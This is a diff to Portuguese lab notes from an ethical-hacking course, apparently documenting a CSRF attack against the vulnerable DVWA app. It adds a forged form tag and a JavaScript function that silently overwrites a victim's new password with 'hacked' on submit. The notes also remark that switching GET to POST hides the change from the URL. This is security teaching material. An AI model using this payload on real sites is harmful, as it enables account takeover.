@@ -117,7 +117,21 @@ O ataque consiste em replicar a página do site, modifiando-a para inserir na tr
 
 O HTML da página está no arquivo [CSRF.html](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0c0939d1cd0e6629c25777a586343ed6bb4874f9/7%20-%20websites/10.1%20-%20CSRF.html), e é basicamente o mesmo da página original com as seguintes modificações:
 
-* `<form action="http://192.168.1.33/dvwa/vulnerabilities/csrf/" method="GET">` - action direciona o usuário de volta ao website, após a mudança de senha.
-* `<input type="password" AUTOCOMPLETE="off" name="password_new" value="hacked">` - inserido `value="hacked"` para alterar o valor para a senha desejada.
-* `<input type="password" AUTOCOMPLETE="off" name="password_conf" value="hacked">` - de forma análoga, iserido `value="hacked"` na confirmação da senha.
+* `<form action="http://192.168.1.33/dvwa/vulnerabilities/csrf/" method="GET" onsubmit="forcarHacked(this)">`
+  * **action** direciona o usuário de volta ao website, após a mudança de senha.
+  * **onsubmit** executa o JavaScript que irá alterar o valor inserido pelo usuário nos campos do formulário antes do envio.
+  * **method GET** pode ser alterado para **POST** para não refletir a alteração na URL. Como o merasploit não reconhece **POST**, não foi utilizado aqui.
+* Inserção do Script forcarHacked
+  ```
+  <script>
+  function forcarHacked(form) {
+    const hack = 'hacked';
+    const pw  = form.querySelector('input[name="password_new"]');
+    const pw2 = form.querySelector('input[name="password_conf"]');
+    if (pw)  pw.value  = hack;
+    if (pw2) pw2.value = hack;
+    // sem return false → deixa enviar normalmente
+  }
+  </script>
+  ```
 * Adicionalmente é copiado o arquivo [main.css](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/4a87172a31cfe7fc32e8ebd32d5307bcda3d5e93/7%20-%20websites/10.2%20-%20main.css) para o lacal de paǵina de ataque, e referenciado no cabeçalho do arquivo [CSRF.html](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0c0939d1cd0e6629c25777a586343ed6bb4874f9/7%20-%20websites/10.1%20-%20CSRF.html) - `<link rel="stylesheet" type="text/css" href="main.css" />`
